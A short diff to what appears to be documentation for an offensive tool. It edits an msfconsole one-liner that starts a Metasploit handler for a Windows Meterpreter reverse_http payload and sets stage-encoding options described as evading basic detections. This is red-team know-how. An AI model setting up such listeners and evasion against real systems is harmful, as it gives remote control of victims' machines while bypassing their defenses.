@@ -16,14 +16,14 @@ x86_64-w64-mingw32-g++ -m64 -Wall -Wextra -std=c++20 -lstdc++ -static -Os -s -sh
 Start listener and evade basic detections when using Meterpreter ([source](https://twitter.com/lpha3ch0/status/1630213398397874178)).
 
 ~~~ bash
-msfconsole -q -x 'use exploit/multi/handler;
-set LHOST 192.168.178.42;
-set LPORT 1337;
-set PAYLOAD windows/x64/meterpreter/reverse_http;
-set EnableStageEncoding true;
-set StageEncoder x64/zutto_dekiru;
-set AutoLoadStdapi false;
-set ExitFunc thread;
+msfconsole -q -x 'use exploit/multi/handler
+set LHOST 192.168.178.42
+set LPORT 1337
+set PAYLOAD windows/x64/meterpreter/reverse_http
+set EnableStageEncoding true
+set StageEncoder x64/zutto_dekiru
+set AutoLoadStdapi false
+set ExitFunc thread
 run'
 ~~~
 
